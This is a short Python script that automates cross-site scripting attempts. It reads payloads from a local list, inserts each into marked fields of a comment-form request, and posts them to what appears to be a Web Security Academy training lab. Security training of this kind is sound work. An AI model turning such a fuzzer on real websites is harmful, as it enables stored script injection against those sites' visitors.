from typing import List
import requests
import json as js 

class XSSJ:
    def __init__(self, url) -> None:
        self.list_xss = open("./dic.xss", "r")
        self.list_tag = open("./tags.xss", "r")
        self.url = url
        self.json = None

    def return_list_xss(self) -> List[str]:
        return [i.replace("\n", "") for i in self.list_xss.readlines()]
    
    def return_list_tag(self) -> List[str]:
        return [i.replace("\n", "") for i in self.list_tag.readlines()]
    
    def url_inject(self, xss_code):
        if self.url:
            return self.url + xss_code
    
    def request_url_get(self, url, Null=None):
        print(url)
        x = requests.get(url)
    
    def request_url_post(self, url, json_):
        x = requests.post(url, json = json_)
        print(x.status_code)

    def inject_json(self, json, xss):
        for key in json.keys():
            if type(json[key]) == str and "!!!" in json[key]:
                json[key] = json[key].replace("!!!", xss)
        return js.loads(js.dumps(json))
                 
    
    def run(self, type = None, json = None, search = None):
        dic_request = {"post":self.request_url_post, "get":self.request_url_get}
        list_xss = self.return_list_xss()
        if search and search in self.return_list_tag():
            for xss in list_xss:
                if "</" + search + ">" in xss:
                    if type:
                        if type == "post":
                            self.json = json.copy()
                            self.json = self.inject_json(self.json, xss)
                        dic_request[type.lower()](self.url, self.json)
                    else:
                        print("Get or Post")
        elif not search:
            for xss in list_xss:
                if type:
                    if type == "post":
                        self.json = json.copy()
                        self.json = self.inject_json(self.json, xss)
                    dic_request[type.lower()](self.url, self.json)
                else:
                    print("Get or Post")
        else:
            print("ta errado sa porra")



def main():
    json_ = {"csrf":"AKW9tdvDBSt20F26w8ueU03E91aT8W97","postId":3,"comment":"!!!","name":"joker","email":"oi@oi"}

    xssj = XSSJ("https://0a8200ae031b7f66c036396b006100f2.web-security-academy.net/post/comment")
    xssj.run(search="script", json=json_, type="post")

if __name__ == "__main__":
    main()
